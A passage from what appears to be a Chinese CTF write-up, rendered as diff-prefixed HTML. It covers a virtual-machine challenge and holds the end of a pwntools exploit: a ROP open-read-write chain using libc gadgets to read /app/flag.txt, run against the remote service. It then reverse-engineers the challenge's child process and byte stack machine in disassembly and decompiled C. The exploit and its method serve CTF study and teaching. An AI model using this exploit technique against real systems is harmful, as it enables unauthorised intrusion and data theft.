+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">-</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;write&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">))</span> <span class="c1"># size</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># payload read(4, cs, 0x30)</span>
+</span></span><span class="line"><span class="cl"><span class="n">child_insns</span> <span class="o">=</span> <span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x4bc</span>
+</span></span><span class="line"><span class="cl"><span class="n">child_insns</span> <span class="o">+=</span> <span class="n">Mov_r_i</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>                    <span class="c1"># rax = 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">child_insns</span> <span class="o">+=</span> <span class="n">Mov_r_i</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>                    <span class="c1"># rdi = 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">child_insns</span> <span class="o">+=</span> <span class="n">Mov_r_i</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">fake_stack</span><span class="p">)</span>          <span class="c1"># rsi = fake_stack</span>
+</span></span><span class="line"><span class="cl"><span class="n">child_insns</span> <span class="o">+=</span> <span class="n">Mov_r_i</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>              <span class="c1"># rdx = 0x1000</span>
+</span></span><span class="line"><span class="cl"><span class="n">child_insns</span> <span class="o">+=</span> <span class="n">Jmp_i</span><span class="p">(</span><span class="mh">0x2353</span><span class="p">)</span>                    <span class="c1"># syscall</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">child_insns</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mh">0x20</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mi">18</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;open&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">-</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">-</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;write&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="s2">&#34;/app/flag.txt</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">orw</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>远程没关，打一下：</p>
+<p><img
+        class="lazyload"
+        data-src="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230011.png"
+        data-srcset="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230011.png, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230011.png 1.5x, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230011.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230011.png"
+        title="image-20220214182435094"></p>
+<p>可以看出题目的主要难度为逆向，洞倒是很简单。不过这种虚拟机题目的思路感觉很有创意。</p>
+<h2 id="rev" class="headerLink">
+    <a href="#rev" class="header-mark"></a>Rev</h2><p>通过之前的分析，子进程检查了我们的输入，逆向的部分就在这里。</p>
+<h3 id="指令分析-1" class="headerLink">
+    <a href="#%e6%8c%87%e4%bb%a4%e5%88%86%e6%9e%90-1" class="header-mark"></a>指令分析</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">child_main:
+</span></span><span class="line"><span class="cl">[0x019e] (1) :: mov r8, 0x2004
+</span></span><span class="line"><span class="cl">[0x01a7] (1) :: call close_ptr
+</span></span><span class="line"><span class="cl">[0x01c6] (1) :: mov r8, 0x2008
+</span></span><span class="line"><span class="cl">[0x01cf] (1) :: call close_ptr
+</span></span><span class="line"><span class="cl">[0x01ee] (1) :: mov r8, 0x0
+</span></span><span class="line"><span class="cl">[0x01f7] (1) :: call close
+</span></span><span class="line"><span class="cl">[0x0216] (1) :: mov r8, 0x1
+</span></span><span class="line"><span class="cl">[0x021f] (1) :: call close
+</span></span><span class="line"><span class="cl">[0x023e] (7) :: jmp child_handler
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>子进程关闭了pipe和标准输入输出。接着又调用了<code>patch_cmd</code></p>
+<h3 id="patch_cmd" class="headerLink">
+    <a href="#patch_cmd" class="header-mark"></a>patch_cmd</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">patch_cmd:
+</span></span><span class="line"><span class="cl">[0x0247] (1) :: mov r8, 0xa
+</span></span><span class="line"><span class="cl">[0x0250] (1) :: mov r9, 0x1000
+</span></span><span class="line"><span class="cl">[0x0259] (3) :: add r9, r3
+</span></span><span class="line"><span class="cl">[0x025b] (1) :: mov r10, 0x2000
+</span></span><span class="line"><span class="cl">[0x0264] (1) :: mov r11, 0x7
+</span></span><span class="line"><span class="cl">[0x026d] (1) :: call do_syscall         ; mprotect(text_base + 0x1000, 0x2000, 7)
+</span></span><span class="line"><span class="cl">[0x028c] (1) :: mov r0, 0x2020
+</span></span><span class="line"><span class="cl">[0x0295] (5) :: mov r1, ds:[r0]         ; code_ptr
+</span></span><span class="line"><span class="cl">[0x0297] (1) :: mov r0, 0x2a23
+</span></span><span class="line"><span class="cl">[0x02a0] (3) :: add r1, r0              ; code_ptr + 0x2a23
+</span></span><span class="line"><span class="cl">[0x02a2] (2) :: mov r9, r1
+</span></span><span class="line"><span class="cl">[0x02a4] (1) :: mov r8, 0x1a00
+</span></span><span class="line"><span class="cl">[0x02ad] (3) :: add r8, r3                 ; text_base + 0x1a00
+</span></span><span class="line"><span class="cl">[0x02af] (1) :: mov r1, 0x2bf6
+</span></span><span class="line"><span class="cl">[0x02b8] (1) :: mov r0, 0x2a23
+</span></span><span class="line"><span class="cl">[0x02c1] (3) :: sub r1, r0                ; size
+</span></span><span class="line"><span class="cl">[0x02c3] (1) :: mov r0, 0x3
+</span></span><span class="line"><span class="cl">[0x02cc] (3) :: shr r1, r0                ; size // 8
+</span></span><span class="line"><span class="cl">[0x02ce] (2) :: mov r10, r1
+</span></span><span class="line"><span class="cl">[0x02d0] (1) :: call memcpy               ; memcpy(text_base + 0x1a00, code_ptr + 0x2a23, 0x1d3)
+</span></span><span class="line"><span class="cl">[0x02ef] (1) :: mov r9, 0xfffff9bcfffff7c8
+</span></span><span class="line"><span class="cl">[0x02f8] (1) :: mov r8, 0x2068
+</span></span><span class="line"><span class="cl">[0x0301] (3) :: add r8, r3
+</span></span><span class="line"><span class="cl">[0x0303] (1) :: call write_mem             ; change jmp table Show --&gt; text_base + 0x1a00
+</span></span><span class="line"><span class="cl">[0x0322] (1) :: mov r8, 0xa
+</span></span><span class="line"><span class="cl">[0x032b] (1) :: mov r9, 0x1000
+</span></span><span class="line"><span class="cl">[0x0334] (3) :: add r9, r3
+</span></span><span class="line"><span class="cl">[0x0336] (1) :: mov r10, 0x2000
+</span></span><span class="line"><span class="cl">[0x033f] (1) :: mov r11, 0x5
+</span></span><span class="line"><span class="cl">[0x0348] (1) :: call do_syscall            ; mprotect(text_base + 0x1000, 0x2000, 5)
+</span></span><span class="line"><span class="cl">[0x0367] (5) :: ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从breach.bind的0x2a23处的0x1d3字节的代码复制到<code>text_base + 0x1a00</code>处，又修改了0xa号指令的偏移表，使其在处理的时候会跳转到<code>text_base + 0x1a00</code>。相当于patch了0xa号指令。</p>
+<p>dump对应指令，进行分析：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_1A0A</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">var</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">stack_pointer</span><span class="p">;</span> <span class="c1">// rdx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">op</span><span class="p">;</span> <span class="c1">// bl
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">LOBYTE</span><span class="p">(</span><span class="n">var</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x140E0</span><span class="p">]</span> <span class="o">+</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x4040</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="n">i64</span><span class="p">);</span><span class="c1">// code + pc + 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">stack_pointer</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">];</span>               <span class="c1">// init: 0x3008
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">op</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x140E0</span><span class="p">]</span> <span class="o">+</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x4040</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">op</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span> <span class="n">op</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x4060</span><span class="n">i64</span><span class="p">)</span> <span class="o">=</span> <span class="n">var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_pointer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405E</span><span class="n">i64</span><span class="p">)</span> <span class="o">+=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405F</span><span class="n">i64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_pointer</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405E</span><span class="n">i64</span><span class="p">)</span> <span class="o">*=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405F</span><span class="n">i64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_pointer</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405E</span><span class="n">i64</span><span class="p">)</span> <span class="o">^=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405F</span><span class="n">i64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_pointer</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405F</span><span class="n">i64</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405F</span><span class="n">i64</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">6</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405E</span><span class="n">i64</span><span class="p">)</span> <span class="o">&amp;=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405F</span><span class="n">i64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_pointer</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">7</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">LOBYTE</span><span class="p">(</span><span class="n">var</span><span class="p">)</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">var</span> <span class="o">+</span> <span class="mh">0x14060</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x405F</span><span class="n">i64</span><span class="p">);</span><span class="c1">// set reg
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_pointer</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">8</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3008</span><span class="n">i64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LOBYTE</span><span class="p">(</span><span class="n">var</span><span class="p">)</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x4060</span><span class="n">i64</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">var</span> <span class="o">+</span> <span class="mh">0x14060</span><span class="p">);</span><span class="c1">// load reg
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x7060</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_pointer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x4040</span><span class="p">]</span> <span class="o">+</span> <span class="mi">2</span><span class="n">i64</span><span class="p">;</span>               <span class="c1">// pc+2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x4040</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">2</span><span class="n">i64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>经过分析可以看出这是一个简单的字节栈机器，MEMORY[0x7060]，即rsp初始为0x3008，指向待操作的栈帧。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Low</span>     <span class="o">+-----+</span>
+</span></span><span class="line"><span class="cl">        <span class="o">|</span>	  <span class="o">|</span>	<span class="o">&lt;--</span> <span class="n">var1</span> <span class="mh">0x405E</span><span class="n">i64</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+-----+</span>
+</span></span><span class="line"><span class="cl">        <span class="o">|</span>	  <span class="o">|</span> <span class="o">&lt;--</span> <span class="n">var2</span> <span class="mh">0x405F</span><span class="n">i64</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+-----+</span>
+</span></span><span class="line"><span class="cl">        <span class="o">|</span>	  <span class="o">|</span> <span class="o">&lt;--</span> <span class="n">stack_pointer</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+-----+</span>
+</span></span><span class="line"><span class="cl">        <span class="o">|</span>	  <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="n">High</span>    <span class="o">+-----+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>指令集如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">op</th>
+<th style="text-align:center">instruction</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0</td>
+<td style="text-align:center">ex.push reg</td>
+<td style="text-align:center">寄存器的最低字节入栈</td>
+</tr>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">ex.push imm</td>
+<td style="text-align:center">立即数入栈</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">ex.add</td>
+<td style="text-align:center">栈顶上方两数相加</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td style="text-align:center">ex.mul</td>
+<td style="text-align:center">栈顶上方两数相乘</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center">ex.xor</td>
+<td style="text-align:center">栈顶上方两数异或</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td style="text-align:center">ex.eqz</td>
+<td style="text-align:center">栈顶上方的数是否为0</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td style="text-align:center">ex.and</td>
